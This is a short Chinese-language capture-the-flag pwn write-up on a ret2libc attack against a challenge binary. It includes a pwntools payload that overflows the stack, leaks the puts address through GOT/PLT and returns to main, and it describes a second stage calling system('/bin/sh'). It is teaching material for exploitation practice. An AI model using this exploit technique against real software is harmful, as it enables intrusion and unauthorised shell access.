# ret2libc Fast Path

## 题目信息

- 分类：Pwn
- 难度：Medium
- 关键字：ROP、libc、栈溢出

## 漏洞点

程序读取输入时没有限制长度，覆盖返回地址后可以控制 RIP。第一阶段泄露 `puts` 的真实地址，第二阶段调用 `system('/bin/sh')`。

## Exploit 流程

```python
from pwn import *

elf = ELF('./chall')
rop = ROP(elf)

payload = b'A' * 72
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
```

## 复盘

如果远程环境开启栈对齐检查，可以在调用 `system` 前补一个单独的 `ret` gadget。
